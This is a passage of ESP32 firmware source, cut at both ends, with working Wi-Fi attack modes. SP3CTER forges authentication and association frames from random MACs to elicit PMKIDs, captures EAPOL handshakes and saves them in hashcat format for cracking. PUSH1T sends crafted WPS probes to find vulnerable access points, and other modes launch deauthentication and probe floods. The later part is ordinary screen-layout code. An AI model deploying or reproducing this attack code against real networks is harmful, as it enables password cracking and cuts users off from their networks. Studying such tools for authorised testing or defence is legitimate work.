  //   DD 25: Vendor Specific, len=37
  //   OUI+type: 00 50 F2 04
  //   Attributes: Version(1.0) | RequestType(Info) | ConfigMethods(PIN) |
  //               RFBands(2.4) | AssocState(None) | ConfigError(None)
  static const uint8_t kWpsIe[] = {
    0xDD, 0x25,
    0x00, 0x50, 0xF2, 0x04,
    0x10, 0x4A, 0x00, 0x01, 0x10,        // Version 1.0
    0x10, 0x3A, 0x00, 0x01, 0x00,        // Request Type: Enrollee Info
    0x10, 0x08, 0x00, 0x02, 0x00, 0x08,  // Config Methods: PIN
    0x10, 0x3C, 0x00, 0x01, 0x01,        // RF Bands: 2.4 GHz
    0x10, 0x02, 0x00, 0x02, 0x00, 0x00,  // Association State: Not Associated
    0x10, 0x09, 0x00, 0x02, 0x00, 0x00,  // Config Error: No Error
    0x10, 0x12, 0x00, 0x02, 0x00, 0x00,  // OS Version: unspecified
  };
  // Supported Rates IE
  static const uint8_t kRatesIe[] = {0x01, 0x08, 0x82, 0x84, 0x8B, 0x96, 0x24, 0x30, 0x48, 0x6C};

  uint8_t ssidLen = (uint8_t)min((size_t)32, target.ssid.length());
  const char* ssid = target.ssid.c_str();
  uint8_t dsIe[3] = {0x03, 0x01, (uint8_t)target.channel};

  const size_t frameLen = 24 + 2 + ssidLen + sizeof(kRatesIe) + sizeof(dsIe) + sizeof(kWpsIe);
  if (frameLen > 220) return;

  uint8_t frame[220] __attribute__((aligned(4)));
  memset(frame, 0, sizeof(frame));

  // 802.11 Probe Request header
  frame[0] = 0x40; frame[1] = 0x00; // FC: management, probe request
  memset(frame + 4, 0xFF, 6);        // DA: broadcast
  esp_wifi_get_mac(WIFI_IF_AP, frame + 10); // SA: our AP MAC
  memcpy(frame + 16, push1tTargetBssid, 6); // BSSID: target
  frame[22] = (uint8_t)((push1tProbeCount & 0x0F) << 4);

  uint8_t* p = frame + 24;
  *p++ = 0x00; *p++ = ssidLen;
  memcpy(p, ssid, ssidLen); p += ssidLen;
  memcpy(p, kRatesIe, sizeof(kRatesIe)); p += sizeof(kRatesIe);
  memcpy(p, dsIe,     sizeof(dsIe));     p += sizeof(dsIe);
  memcpy(p, kWpsIe,   sizeof(kWpsIe));   p += sizeof(kWpsIe);

  size_t txLen = (size_t)(p - frame);
  esp_err_t r = esp_wifi_80211_tx(WIFI_IF_AP, frame, txLen, false);
  if (r != ESP_OK) esp_wifi_80211_tx(WIFI_IF_STA, frame, txLen, false);
  push1tProbeCount++;
}

static void push1tTick() {
  if (autoMode != AutoMode::PUSH1T) return;
  const uint32_t now = millis();
  // Send WPS probe requests every 4 s
  if (now - push1tLastProbeMs >= 4000U) {
    push1tLastProbeMs = now;
    push1tSendProbeRequest();
    if (push1tWpsDetected) {
      Serial.printf("[PUSH1T] probe#%lu wps=YES locked=%d vuln=%d ver=0x%02X mfr='%s' dev='%s'\n",
                    (unsigned long)push1tProbeCount, push1tWpsLocked, push1tVulnerable,
                    push1tWpsVersion, push1tManufacturer, push1tDeviceName);
    } else {
      Serial.printf("[PUSH1T] probe#%lu wps=NO (waiting for beacon)\n",
                    (unsigned long)push1tProbeCount);
    }
  }
}

// ============================================================
//  SP3CTER engine — Ghost PMKID elicitation + passive EAPOL intel
// ============================================================

// ── Helpers ───────────────────────────────────────────────────────────────

// Locate the EAPOL start offset within a raw 802.11 frame.
// Returns 0 if not found. EAPOL data byte 0 is at the returned offset.
static uint32_t specterFindEapolOffset(const uint8_t* frame, uint32_t len) {
  for (uint32_t i = 24; i + 1 < len; i++) {
    if (frame[i] == 0x88 && frame[i+1] == 0x8e) return i + 2;
  }
  return 0;
}

// Classify an EAPOL-Key frame. Returns 1=M1,2=M2,3=M3,4=M4,0=not EAPOL-Key.
static uint8_t specterClassifyEapol(const uint8_t* frame, uint32_t len) {
  const uint32_t eapol = specterFindEapolOffset(frame, len);
  if (!eapol || eapol + 4 > len) return 0;
  if (frame[eapol + 1] != 0x03) return 0;  // not EAPOL-Key
  const uint32_t key = eapol + 4;
  if (key + 95 > len) return 0;
  if (frame[key] != 0x02) return 0;          // not RSN descriptor
  const uint16_t ki = ((uint16_t)frame[key+1] << 8) | frame[key+2];
  const bool ack     = (ki & 0x0080) != 0;
  const bool mic     = (ki & 0x0100) != 0;
  const bool secure  = (ki & 0x0200) != 0;
  const bool install = (ki & 0x0040) != 0;
  if (ack  && !mic)              return 1; // M1
  if (!ack &&  mic && !secure)   return 2; // M2
  if (ack  &&  mic &&  install)  return 3; // M3
  if (!ack &&  mic &&  secure)   return 4; // M4
  return 0;
}

// Check replay-counter dedup. Returns true if this is a retransmission.
static bool specterIsDuplicate(const uint8_t* frame, uint32_t len) {
  const uint32_t eapol = specterFindEapolOffset(frame, len);
  if (!eapol) return false;
  const uint32_t key = eapol + 4;
  if (key + 13 > len) return false;
  // Addr2 (SA) is at buf+10 (ToDS frame: STA) or buf+4 (FromDS: handled by searching dedup by rc)
  const uint8_t* sa = frame + 10;
  // replay counter at key+5 (8 bytes)
  uint64_t rc = 0;
  for (int i = 0; i < 8; i++) rc = (rc << 8) | frame[key + 5 + i];
  for (uint8_t i = 0; i < SPECTER_DEDUP_MAX; i++) {
    if (memcmp(specterDedup[i].mac, sa, 6) == 0 && specterDedup[i].replayCtr == rc) return true;
  }
  memcpy(specterDedup[specterDedupHead].mac, sa, 6);
  specterDedup[specterDedupHead].replayCtr = rc;
  specterDedupHead = (specterDedupHead + 1) % SPECTER_DEDUP_MAX;
  return false;
}

// Extract 16-byte PMKID from EAPOL M1 Key Data KDEs. Returns true on success.
static bool specterExtractPmkid(const uint8_t* frame, uint32_t len, uint8_t* pmkidOut) {
  if (specterClassifyEapol(frame, len) != 1) return false;
  const uint32_t eapol = specterFindEapolOffset(frame, len);
  if (!eapol) return false;
  const uint32_t key = eapol + 4;
  if (key + 95 > len) return false;
  const uint16_t dataLen = ((uint16_t)frame[key+93] << 8) | frame[key+94];
  if (dataLen == 0) return false;
  const uint32_t dataStart = key + 95;
  if (dataStart + dataLen > len) return false;
  // Walk KDEs looking for PMKID: DD 14 00 0F AC 04 [16 bytes]
  uint32_t i = dataStart;
  while (i + 6 <= dataStart + dataLen) {
    if (frame[i] != 0xDD) break;
    const uint8_t klen = frame[i+1];
    if (i + 2 + klen > dataStart + dataLen) break;
    if (klen >= 20 && frame[i+2]==0x00 && frame[i+3]==0x0F && frame[i+4]==0xAC && frame[i+5]==0x04) {
      memcpy(pmkidOut, frame + i + 6, 16);
      return true;
    }
    i += 2 + klen;
  }
  return false;
}

// Find or LRU-create a HS track entry for a given STA MAC.
static SpecterHsTrack* specterFindOrCreateHsTrack(const uint8_t* staMac) {
  // Find existing
  for (uint8_t i = 0; i < specterHsCount; i++)
    if (memcmp(specterHsTracks[i].staMac, staMac, 6) == 0) return &specterHsTracks[i];
  // Allocate or evict oldest
  uint8_t slot = (specterHsCount < SPECTER_HS_MAX) ? specterHsCount++ : 0;
  if (specterHsCount == SPECTER_HS_MAX) {
    uint32_t oldest = specterHsTracks[0].lastSeenMs;
    for (uint8_t i = 1; i < SPECTER_HS_MAX; i++)
      if (specterHsTracks[i].lastSeenMs < oldest) { oldest = specterHsTracks[i].lastSeenMs; slot = i; }
  }
  memcpy(specterHsTracks[slot].staMac, staMac, 6);
  specterHsTracks[slot] = {0};
  memcpy(specterHsTracks[slot].staMac, staMac, 6);
  return &specterHsTracks[slot];
}

// Track a passive client MAC (data frame STA).
static void specterAddClient(const uint8_t* mac) {
  if ((mac[0] & 0x01) != 0) return; // skip multicast
  for (uint8_t i = 0; i < specterClientCount; i++)
    if (memcmp(specterClientMacs[i], mac, 6) == 0) return;
  // Log new client discovery (yellow, only first 8 to avoid spam)
  if (specterClientCount < 8) {
    char logbuf[34];
    snprintf(logbuf, sizeof(logbuf), "? Client %02x:%02x:%02x",
             mac[3], mac[4], mac[5]);
    specterLogAdd(logbuf, 0xFFE0);  // yellow
  }
  if (specterClientCount < 8) memcpy(specterClientMacs[specterClientCount++], mac, 6);
}

// Write all collected PMKIDs to hashcat hc22000 format on SD.
static void specterWriteHc22000() {
  if (!sdReady || specterPmkidCount == 0 || captureDir[0] == '\0') return;
  char path[160];
  snprintf(path, sizeof(path), "%s/specter.hc22000", captureDir);
  File f = SD.open(path, FILE_WRITE);
  if (!f) return;
  for (uint8_t i = 0; i < specterPmkidCount; i++) {
    const SpecterPmkid& p = specterPmkids[i];
    // PMKID hex
    for (int b = 0; b < 16; b++) { char h[3]; snprintf(h,3,"%02x",p.pmkid[b]); f.print(h); }
    f.print("*");
    for (int b = 0; b < 6;  b++) { char h[3]; snprintf(h,3,"%02x",p.apMac[b]);  f.print(h); }
    f.print("*");
    for (int b = 0; b < 6;  b++) { char h[3]; snprintf(h,3,"%02x",p.staMac[b]); f.print(h); }
    f.print("*");
    // SSID as hex
    for (size_t b = 0; b < target.ssid.length(); b++) {
      char h[3]; snprintf(h, 3, "%02x", (uint8_t)target.ssid[b]); f.print(h);
    }
    f.println();
  }
  f.close();
  Serial.printf("[SP3CTER] wrote %d PMKID(s) to %s\n", specterPmkidCount, path);
}

// ── EAPOL handler (called from handleCapturedPacket when SP3CTER active) ──

static void specterHandleEapol(const uint8_t* frame, uint32_t len) {
  if (specterIsDuplicate(frame, len)) return;
  const uint8_t msg = specterClassifyEapol(frame, len);
  if (msg == 0) return;

  // Determine STA MAC: FC byte 1 ToDS/FromDS bits
  const uint8_t fc1 = frame[1];
  const bool toDS   = (fc1 & 0x01) != 0;
  const bool fromDS = (fc1 & 0x02) != 0;
  const uint8_t* apMac  = fromDS ? (frame + 10) : (frame + 4);
  const uint8_t* staMac = fromDS ? (frame + 4)  : (frame + 10);

  // Update HS tracking
  SpecterHsTrack* t = specterFindOrCreateHsTrack(staMac);
  t->lastSeenMs = millis();
  if (msg == 1) t->m1 = true;
  else if (msg == 2) t->m2 = true;
  else if (msg == 3) t->m3 = true;
  else if (msg == 4) t->m4 = true;

  // Log EAPOL message (cyan for M1/M3 from AP, white for M2/M4 from STA)
  {
    char logbuf[34];
    const char* mname = msg==1?"M1":msg==2?"M2":msg==3?"M3":"M4";
    snprintf(logbuf, sizeof(logbuf), "%s %02x:%02x:%02x",
             mname, staMac[3], staMac[4], staMac[5]);
    specterLogAdd(logbuf, (msg==1||msg==3) ? 0x07FF : 0xFFFF);  // cyan/white
  }

  // On M1: attempt PMKID extraction
  if (msg == 1 && specterPmkidCount < SPECTER_PMKID_MAX) {
    uint8_t pmkid[16];
    if (specterExtractPmkid(frame, len, pmkid)) {
      // Deduplicate by PMKID value
      bool dup = false;
      for (uint8_t i = 0; i < specterPmkidCount; i++)
        if (memcmp(specterPmkids[i].pmkid, pmkid, 16) == 0) { dup = true; break; }
      if (!dup) {
        SpecterPmkid& p = specterPmkids[specterPmkidCount++];
        memcpy(p.pmkid, pmkid, 16);
        memcpy(p.apMac,  apMac,  6);
        memcpy(p.staMac, staMac, 6);
        specterWriteHc22000();
        char logbuf[34];
        snprintf(logbuf, sizeof(logbuf), "! PMKID #%u CAPTURED", specterPmkidCount);
        specterLogAdd(logbuf, 0x07E0);  // green
        Serial.printf("[SP3CTER] PMKID #%d captured! %02x%02x%02x%02x...\n",
                      specterPmkidCount, pmkid[0],pmkid[1],pmkid[2],pmkid[3]);
      }
    }
    // If no PMKID KDE, the M1 still starts a 4-way — track it
    specterAddClient(staMac);
  }
  if (msg == 2) specterAddClient(staMac);
}

// ── Open-AP data frame handler ─────────────────────────────────────────────

static void specterHandleDataFrame(const uint8_t* frame, uint32_t len) {
  if (len < 26) return;
  // Extract STA MAC from ToDS frames (STA→AP: Addr2=STA)
  const uint8_t fc1 = frame[1];
  if ((fc1 & 0x01) != 0) specterAddClient(frame + 10); // ToDS: Addr2=STA
  else if ((fc1 & 0x02) != 0) specterAddClient(frame + 4); // FromDS: Addr1=STA
}

// ── Ghost PMKID frame transmitter ─────────────────────────────────────────

static void specterRandomizeSta() {
  // Locally administered, unicast MAC
  specterFakeStaMac[0] = 0x02;
  specterFakeStaMac[1] = (uint8_t)(esp_random() & 0xFF);
  specterFakeStaMac[2] = (uint8_t)(esp_random() & 0xFF);
  specterFakeStaMac[3] = (uint8_t)(esp_random() & 0xFF);
  specterFakeStaMac[4] = (uint8_t)(esp_random() & 0xFF);
  specterFakeStaMac[5] = (uint8_t)(esp_random() & 0xFF);
}

static void specterSendGhostAuth() {
  if (!hasTarget) return;
  uint8_t bssid[6];
  if (!macFromString(target.bssid.c_str(), bssid)) return;

  // 802.11 Authentication Request (Open System, seq 1)
  uint8_t auth[30] = {
    0xB0, 0x00,              // FC: mgmt, subtype=11 (auth)
    0x3A, 0x01,              // duration
    0,0,0,0,0,0,             // Addr1: AP BSSID
    0,0,0,0,0,0,             // Addr2: fake STA
    0,0,0,0,0,0,             // Addr3: AP BSSID
    0x10, 0x00,              // seq
    0x00, 0x00,              // auth algorithm: open system
    0x01, 0x00,              // auth seq: 1
    0x00, 0x00               // status: success
  };
  memcpy(auth + 4,  bssid,             6);
  memcpy(auth + 10, specterFakeStaMac, 6);
  memcpy(auth + 16, bssid,             6);
  esp_wifi_80211_tx(WIFI_IF_AP, auth, sizeof(auth), false);
  // Log ghost event (magenta)
  char ghostlog[34];
  snprintf(ghostlog, sizeof(ghostlog), "> Ghost #%lu auth sent", (unsigned long)(specterGhostCount+1));
  specterLogAdd(ghostlog, 0xF81F);  // magenta
}

static void specterSendGhostAssoc() {
  if (!hasTarget) return;
  uint8_t bssid[6];
  if (!macFromString(target.bssid.c_str(), bssid)) return;

  const char* ssid = target.ssid.c_str();
  const uint8_t ssidLen = (uint8_t)min((int)strlen(ssid), 32);

  // RSN IE for WPA2-CCMP-PSK (no PMKID list — let AP generate one)
  static const uint8_t rsnIe[] = {
    0x30, 0x14,               // ID=RSN, len=20
    0x01, 0x00,               // version
    0x00, 0x0F, 0xAC, 0x04,  // group cipher: CCMP
    0x01, 0x00,               // pairwise count: 1
    0x00, 0x0F, 0xAC, 0x04,  // pairwise: CCMP
    0x01, 0x00,               // AKM count: 1
    0x00, 0x0F, 0xAC, 0x02,  // AKM: PSK
    0x00, 0x00                // RSN capabilities
  };
  static const uint8_t rates[] = {
    0x01, 0x08, 0x82, 0x84, 0x8B, 0x96, 0x24, 0x30, 0x48, 0x6C
  };

  const uint16_t bodyLen = 4 + (2 + ssidLen) + sizeof(rates) + sizeof(rsnIe);
  const uint16_t frameLen = 24 + bodyLen;
  if (frameLen > 256) return;

  uint8_t frame[256] = {};
  // 802.11 header
  frame[0] = 0x00; frame[1] = 0x00;   // FC: mgmt assoc req
  frame[2] = 0x3A; frame[3] = 0x01;   // duration
  memcpy(frame + 4,  bssid,             6);  // Addr1
  memcpy(frame + 10, specterFakeStaMac, 6);  // Addr2
  memcpy(frame + 16, bssid,             6);  // Addr3
  frame[22] = 0x20; frame[23] = 0x00;        // seq
  // Capability info, listen interval
  frame[24] = 0x31; frame[25] = 0x04;
  frame[26] = 0x0A; frame[27] = 0x00;
  // SSID IE
  uint16_t pos = 28;
  frame[pos++] = 0x00; frame[pos++] = ssidLen;
  memcpy(frame + pos, ssid, ssidLen); pos += ssidLen;
  // Supported rates
  memcpy(frame + pos, rates, sizeof(rates)); pos += sizeof(rates);
  // RSN IE
  memcpy(frame + pos, rsnIe, sizeof(rsnIe)); pos += sizeof(rsnIe);

  esp_wifi_80211_tx(WIFI_IF_AP, frame, pos, false);
}

// ── Main tick (called from loop()) ─────────────────────────────────────────

static void specterTick() {
  if (autoMode != AutoMode::SP3CTER) return;
  const uint32_t now = millis();

  // Ghost sequence: Auth → 150ms pause → Assoc, every 8s
  if (now - specterLastGhostMs >= 8000U) {
    specterLastGhostMs   = now;
    specterGhostSentMs   = now;
    specterGhostInFlight = true;
    specterAssocSent     = false;
    specterRandomizeSta();
    specterSendGhostAuth();
    specterGhostCount++;
    Serial.printf("[SP3CTER] ghost #%lu auth sent (pmkids=%u clients=%u)\n",
                  (unsigned long)specterGhostCount, specterPmkidCount, specterClientCount);
  }
  // Send Assoc 150 ms after Auth
  if (specterGhostInFlight && !specterAssocSent && (now - specterGhostSentMs >= 150U)) {
    specterSendGhostAssoc();
    specterAssocSent = true;
  }
  // Reset ghost window after 3 s
  if (specterGhostInFlight && (now - specterGhostSentMs >= 3000U)) {
    specterGhostInFlight = false;
  }
}

static void disengageAutoMode() {
  if (autoMode == AutoMode::NONE) return;

  Serial.printf("[auto] stopping %s mode\n", autoModeStr(autoMode));
  
  // Stop packet capture and close files
  rawCaptureActive = false;
  pcapCaptureActive = false;
  
  // Stop deauth for JAMMIT and Y0INK
  if (autoMode == AutoMode::JAMMIT) {
    // Write session summary to log before stopping
    if (sdReady && jammitSessionLogPath[0] != '\0') {
      File f = SD.open(jammitSessionLogPath, FILE_APPEND);
      if (f) {
        uint32_t elapsed = millis() - jammitSessionStartMs;
        f.printf("--- Session ended: elapsed=%lu.%03lus deauths=%lu clients=%d ---\n",
                 elapsed / 1000, elapsed % 1000,
                 (unsigned long)jammitDeauthCount, (int)jammitClientCount);
        f.close();
      }
    }
    // Tear down STA+WSL WiFi
    stopJammitWifi();
    jammitLastTickMs = 0;
    jammitDeauthCount = 0;
    jammitClientCount = 0;
    s_jammitBssidCached = false;
  } else if (autoMode == AutoMode::Y0INK) {
    YoinkEngine::stop();
    yoinkLastTickMs = 0;
    yoinkDeauthCount = 0;
  } else if (autoMode == AutoMode::PROBE_FLOOD || autoMode == AutoMode::DEAUTH_FLOOD) {
    // Stop PACKETLAB attack (PROBE_FLOOD, DEAUTH_FLOOD)
    PACKETLABStopAttack();
  } else if (autoMode == AutoMode::PUSH1T) {
    push1tBssidCached = false;
    Serial.printf("[PUSH1T] stopped probes=%lu wps=%d vuln=%d\n",
                  (unsigned long)push1tProbeCount, push1tWpsDetected, push1tVulnerable);
  } else if (autoMode == AutoMode::SP3CTER) {
    specterGhostInFlight = false;
    specterWriteHc22000(); // flush any remaining PMKIDs
    Serial.printf("[SP3CTER] stopped ghosts=%lu pmkids=%u clients=%u hs_tracks=%u\n",
                  (unsigned long)specterGhostCount, specterPmkidCount,
                  specterClientCount, specterHsCount);
  }

  // Clear mode
  autoMode = AutoMode::NONE;
}

static void engageAutoMode(AutoMode mode) {
  // Stop any currently active mode first
  if (autoMode != AutoMode::NONE) {
    disengageAutoMode();
  }
  
  if (!hasTarget) {
    Serial.printf("[auto] %s: no target\n", autoModeStr(mode));
    return;
  }

  autoMode = mode;
  lockChannel = true;
  // JAMMIT and Y0INK manage their own WiFi setup (STA+WSL bypass)
  // Skip startSniff() (which uses AP mode) for those modes
  if (!sniffActive && mode != AutoMode::Y0INK && mode != AutoMode::JAMMIT && mode != AutoMode::SCOPE) {
    startSniff();
  }

  rawCaptureActive = (mode == AutoMode::SP3CTER || mode == AutoMode::JAMMIT);
  pcapCaptureActive = (mode == AutoMode::SP3CTER || mode == AutoMode::JAMMIT || mode == AutoMode::Y0INK);
  if (rawCaptureActive) rawLastLogMs = 0;
  if (pcapCaptureActive && sdReady && !pcapFilesOpen) initCaptureFiles();

  if (mode == AutoMode::Y0INK) {
    // === NEW YOINK ENGINE ===
    // YoinkEngine sets up its own WiFi (STA+promisc+WSL bypass)
    // It does NOT use the old startSniff() / AP-mode approach
    YoinkEngine::setLogCallback(yoinkLogCallback);
    YoinkEngine::start();
    pushConsoleEvent("INFO", "AUTO", "Y0INK v2 engaged: OINK state machine + WSL bypass");
    Serial.println("[auto] Y0INK v2 engaged: OINK state machine + WSL bypass");
    yoinkLastTickMs = 0;
    yoinkLastPkts = 0;
    yoinkClientCount = 0;
    yoinkHandshakeCaptureCount = 0;
    yoinkLastDeauthMs = millis();
    yoinkDeauthCount = 0;
  } else if (mode == AutoMode::SP3CTER) {
    // Reset all SP3CTER state
    specterPmkidCount    = 0;
    specterHsCount       = 0;
    specterClientCount   = 0;
    specterDedupHead     = 0;
    specterGhostCount    = 0;
    specterLastGhostMs   = 0;
    specterGhostInFlight = false;
    specterAssocSent     = false;
    memset(specterDedup,     0, sizeof(specterDedup));
    memset(specterPmkids,    0, sizeof(specterPmkids));
    memset(specterHsTracks,  0, sizeof(specterHsTracks));
    memset(specterClientMacs,0, sizeof(specterClientMacs));
    specterLogHead  = 0;
    specterLogCount = 0;
    memset(specterEventLog, 0, sizeof(specterEventLog));
    specterRandomizeSta();
    {
      char logbuf[34];
      snprintf(logbuf, sizeof(logbuf), "Session started CH:%d", target.channel);
      specterLogAdd(logbuf, 0x07FF);  // cyan
    }
    Serial.printf("[SP3CTER] engaged: target='%s' ch=%d\n",
                  target.ssid.c_str(), target.channel);
  } else if (mode == AutoMode::SCOPE) {
    scopeResetWaterfall();
    scopeScanActive = false;
    scopeScanStartedMs = 0;
    scopeLastScanMs = 0;
    scopeLastDrawMs = 0;
    Serial.println("[auto] SCOPE engaged (AP waterfall graph)");
  } else if (mode == AutoMode::JAMMIT) {
    jammitLastTickMs = 0;
    jammitLastPkts = 0;
    jammitLastDeauthMs = 0;
    jammitDeauthCount = 0;
    jammitLastScore = 0;
    jammitClientCount = 0;
    jammitSessionStartMs = millis();
    memset(jammitClientMacs, 0, sizeof(jammitClientMacs));
    // Cache target BSSID bytes for fast ISR-side comparison
    s_jammitBssidCached = macFromString(target.bssid.c_str(), s_jammitTargetBssid);
    // Create session log + deauth PCAP on SD
    jammitInitSaveFiles();
    // Start WiFi in STA+WSL+promisc mode (overrides AP mode from startSniff)
    startJammitWifi();
    // Enable capture tracking
    rawCaptureActive = true;
    pcapCaptureActive = true;
    if (sdReady && !pcapFilesOpen) initCaptureFiles();
    jammitLog("JAMMIT engaged: target='%s' ch=%d — WSL+STA+promisc",
              target.ssid.c_str(), target.channel);
    jammitLog("Deauth bursts every 2s: broadcast + targeted per-client via WSL");
  } else if (mode == AutoMode::PROBE_FLOOD) {
    // === PROBE FLOOD: Wake sleeping clients with probe requests ===
    // Enable PCAP capture to log probe responses
    if (!sniffActive) startSniff();
    rawCaptureActive = true;
    pcapCaptureActive = true;
    if (sdReady && !pcapFilesOpen) initCaptureFiles();
    // Start probe flood via PACKETLAB
    PACKETLABStartProbeFlood(target.ssid.c_str(), target.channel, justGoModeDurationMs(AutoMode::PROBE_FLOOD));
    Serial.printf("[auto] PROBE_FLOOD engaged: '%s' ch=%d\n", target.ssid.c_str(), target.channel);
  } else if (mode == AutoMode::DEAUTH_FLOOD) {
    // === DEAUTH_FLOOD: Broadcast deauth to all devices on channel ===
    // CHAOS mode: aggressive channel-wide deauth
    if (!sniffActive) startSniff();
    rawCaptureActive = true;
    pcapCaptureActive = true;
    if (sdReady && !pcapFilesOpen) initCaptureFiles();
    // Start broadcast deauth flood
    PACKETLABStartDeauthBroadcast(target.channel, justGoModeDurationMs(AutoMode::DEAUTH_FLOOD));
    Serial.printf("[auto] DEAUTH_FLOOD engaged: ch=%d (broadcast to all)\n", target.channel);
  } else if (mode == AutoMode::PUSH1T) {
    // === PUSH1T: WPS beacon detection + active probing ===
    if (!sniffActive) startSniff();
    push1tWpsDetected  = false;
    push1tWpsLocked    = false;
    push1tWpsVersion   = 0;
    push1tVulnerable   = false;
    push1tProbeCount   = 0;
    push1tLastProbeMs  = 0;
    push1tManufacturer[0] = '\0';
    push1tDeviceName[0]   = '\0';
    push1tBssidCached = macFromString(target.bssid.c_str(), push1tTargetBssid);
    Serial.printf("[PUSH1T] engaged: target='%s' ch=%d bssidCached=%d\n",
                  target.ssid.c_str(), target.channel, push1tBssidCached);
  }
}


static void drawConfigRow(const char* label, int y, const char* value) {
  tft.setTextDatum(TL_DATUM);
  applyFontSm();
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.drawString(label, 10, y);

  tft.setTextDatum(TR_DATUM);
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.drawString(value, tft.width() - 10, y);
}

static void drawConfig() {
  tft.fillScreen(TFT_BLACK);
  drawHeader("Config");
  drawUniversalBackground();

#if defined(NEONDRIVE_TARGET_CYD)
  const UiRect content = computeContentRect();
  const UiRect bottom = computeBottomBarRect();
  const int w = tft.width();

  btnBack = {bottom.x, bottom.y, 98, UI_BUTTON_H, "Back"};
  drawButton(btnBack, TFT_NAVY, TFT_WHITE, TFT_WHITE);

  const int panelX = 8;
  const int panelY = 34;
  const int panelH = 20;
  const int panelRight = max(panelX + 140, uiActionDockSafeLeft() - 5);
  const int panelW = max(140, panelRight - panelX);
  tft.drawRoundRect(panelX, panelY, panelW, panelH, 5, TFT_DARKGREY);
  tft.setTextDatum(TL_DATUM);
  applyFontSm();
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.drawString("System + connectivity controls", panelX + 5, panelY + 6);

  // Strict 2x3 grid with explicit no-overlap spacing.
  // Keep y > threshold so global top-button Y shift never applies on this screen.
  const int gridLeft = content.x;
  const int gapX = 10;
  const int gapY = 8;
  const int gridTop = max(panelY + panelH + 8, UI_TOP_BUTTON_SHIFT_THRESHOLD_Y + 4);
  const int gridBottom = bottom.y - 8;
  const int spanH = max(96, gridBottom - gridTop);
  int bh = (spanH - (gapY * 3)) / 4;
  bh = clampi(bh, 22, 36);
  const int usedH = (bh * 4) + (gapY * 3);
  const int y0 = gridTop + max(0, (spanH - usedH) / 2);
  const int y1 = y0 + bh + gapY;
  const int y2 = y1 + bh + gapY;
  const int y3 = y2 + bh + gapY;
  const int rowRightAll = min({uiRightLimitForBand(y0, bh), uiRightLimitForBand(y1, bh),
                               uiRightLimitForBand(y2, bh), uiRightLimitForBand(y3, bh),
                               w - content.x});
  const int bw = max(56, (rowRightAll - gridLeft - gapX) / 2);
  const int x0 = gridLeft;
  const int x1 = gridLeft + bw + gapX;

  btnCfgWifi = {x0, y0, bw, bh, "Adapter"};
  drawButton(btnCfgWifi, TFT_BLUE, TFT_CYAN, TFT_WHITE);

  btnCfgWifiConnect = {x1, y0, bw, bh, "WiFi Link"};
  drawButton(btnCfgWifiConnect, TFT_DARKCYAN, TFT_WHITE, TFT_WHITE);

  btnCfgWebserver = {x0, y1, bw, bh, "Web + AP"};
  drawButton(btnCfgWebserver, TFT_DARKGREEN, TFT_YELLOW, TFT_WHITE);

  btnCfgStartup = {x1, y1, bw, bh, "Startup"};
  drawButton(btnCfgStartup, TFT_MAROON, TFT_ORANGE, TFT_WHITE);

  btnCfgTelemetry = {x0, y2, bw, bh, "Telemetry"};
  drawButton(btnCfgTelemetry, 0x022F, 0x7D7C, TFT_WHITE);

  btnCfgLed = {x1, y2, bw, bh, "LED"};
  drawButton(btnCfgLed, 0x4A49, TFT_CYAN, TFT_WHITE);

  btnCfgSync = {x0, y3, bw, bh, "Sync"};
  drawButton(btnCfgSync, 0x0228, TFT_GREEN, TFT_WHITE);

  uiLogLayout("drawConfig(CYD)", content, bottom);
  uiLogButtonRect("Config.Back", btnBack);
  drawBorder();
  return;
#else

  const bool compact = (tft.height() <= 180);
  const UiRect content = computeContentRect();
  const UiRect bottom = computeBottomBarRect();
  const int pad = content.x + 4;
  const int gap = compact ? 4 : 10;
  const int cols = 2;
  const int bh = compact ? 22 : 34;
  const int bw = (content.w - 8 - gap) / cols;
  const int top = content.y + (compact ? 0 : 2);

  btnBack = {bottom.x, bottom.y, 92, UI_BUTTON_H, "Back"};
  drawButton(btnBack, TFT_NAVY, TFT_WHITE, TFT_WHITE);

  if (!compact) {
    // Fill the top-left header band with a quick summary.
    const int panelX = 8;
    const int panelY = 34;
    const int panelH = max(20, content.y - panelY - 4);
    const int panelW = max(120, uiRightLimitForBand(panelY, panelH) - panelX);
    tft.drawRoundRect(panelX, panelY, panelW, panelH, 6, TFT_DARKGREY);
    tft.fillRoundRect(panelX + 1, panelY + 1, panelW - 2, panelH - 2, 6, TFT_BLACK);
    tft.setTextDatum(TL_DATUM);
    applyFontSm();
    tft.setTextColor(TFT_CYAN, TFT_BLACK);
    tft.drawString("Adapter | WiFi Link | Web + AP", panelX + 5, panelY + 4);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.drawString("Startup | Telemetry | LED", panelX + 5, panelY + 14);
  } else {
    tft.setTextDatum(TL_DATUM);
    applyFontSm();
    tft.setTextColor(TFT_CYAN, TFT_BLACK);
    tft.drawString("BTN1=Next  BTN2=Select", content.x + 2, content.y - 10);
  }

  btnCfgWifi = {pad, top, bw, bh, compact ? "Adapter" : "Adapter"};
  drawButton(btnCfgWifi, TFT_DARKCYAN, TFT_MAGENTA, TFT_WHITE);

  btnCfgWifiConnect = {pad + bw + gap, top, bw, bh, compact ? "WiFi" : "WiFi Link"};
  drawButton(btnCfgWifiConnect, TFT_DARKCYAN, TFT_CYAN, TFT_WHITE);

  btnCfgWebserver = {pad, top + bh + gap, bw, bh, compact ? "Web/AP" : "Web + AP"};
  drawButton(btnCfgWebserver, TFT_NAVY, TFT_GREEN, TFT_WHITE);

  btnCfgStartup = {pad + bw + gap, top + bh + gap, bw, bh, "Startup"};
  drawButton(btnCfgStartup, TFT_DARKGREY, TFT_YELLOW, TFT_WHITE);

  btnCfgTelemetry = {pad, top + ((bh + gap) * 2), bw, bh, compact ? "Telem" : "Telemetry"};
  drawButton(btnCfgTelemetry, TFT_DARKGREY, TFT_CYAN, TFT_WHITE);

  btnCfgLed = {pad + bw + gap, top + ((bh + gap) * 2), bw, bh, compact ? "LED" : "LED Control"};
  drawButton(btnCfgLed, TFT_DARKGREY, TFT_YELLOW, TFT_WHITE);

  uiLogLayout("drawConfig", content, bottom);
  uiLogButtonRect("Config.Back", btnBack);
  drawBorder();
#endif
}

static void drawSync() {
  tft.fillScreen(TFT_BLACK);
  drawHeader("Sync");
  drawUniversalBackground();

  const UiRect content = computeContentRect();
  const UiRect bottom  = computeBottomBarRect();
  const int w = tft.width();

  btnBack = {bottom.x, bottom.y, 92, UI_BUTTON_H, "Back"};
